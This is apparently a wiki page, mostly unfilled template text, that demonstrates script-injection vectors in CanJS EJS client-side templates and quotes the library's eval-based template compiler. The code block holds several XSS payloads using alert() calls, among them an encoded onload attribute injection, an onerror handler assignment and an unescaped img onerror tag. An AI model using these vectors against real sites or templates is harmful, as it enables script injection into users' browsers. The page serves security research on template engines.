#summary One-sentence summary of this page.
#labels canjs,ejs

= Introduction =

Add your content here.


= Details =

Add your content here.  Format your content with:
  * Text in *bold* or _italic_
  * Headings, paragraphs, and lists
  * Automatic links to other wiki pages

{{{
<script src="http://code.jquery.com/jquery-2.0.3.min.js"></script>

<script src="http://canjs.us/release/latest/can.jquery.js"></script> 
<script src="http://canjs.us/release/latest/can.construct.proxy.js"></script> 
<script src="http://canjs.us/release/latest/can.control.plugin.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.attributes.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.backup.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.delegate.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.setter.js"></script> 
<script src="http://canjs.us/release/latest/can.observe.validations.js"></script> 
<script src="http://canjs.us/release/latest/can.view.modifiers.js"></script> 
<script src="http://canjs.us/release/latest/can.fixture.js"></script> 
<script src="http://canjs.us/release/latest/can.view.mustache.js"></script> 
<script src="http://canjs.us/release/latest/can.construct.super.js"></script> 

<body>

    <script type="text/ejs" id="todoList">
        <% alert(0) // standard JS exec %>
	    <svg class=<%= '1\x20onload\x3Dalert(1)' // attribute injecton %>>
	    <img src="x"<%=onerror=function(){alert(2)} // event handler assignment %>>
	    <%== '\x3Cimg src=x onerror=alert(3)>' // unsafe and encoded %>
	    <%%= '<img src=x onerror=alert(4)>' // generator code %>
    </script>
	
	<script>
	can.view('todoList', {});
	</script>
</body>
}}}

== Eval via myEval ==

{{{
myEval = function(script) {
    eval(script);
}, 

[...]

var template = buff.join(''), 
out = {
    out: 'with(_VIEW) { with (_CONTEXT) {' + template + " " + finishTxt + "}}"
};
// Use `eval` instead of creating a function, because it is easier to debug.
myEval.call(out, 'this.fn = (function(_CONTEXT,_VIEW){' + out.out + '});\r\n//@ sourceURL=' + name + ".js");
                
return out;
}}}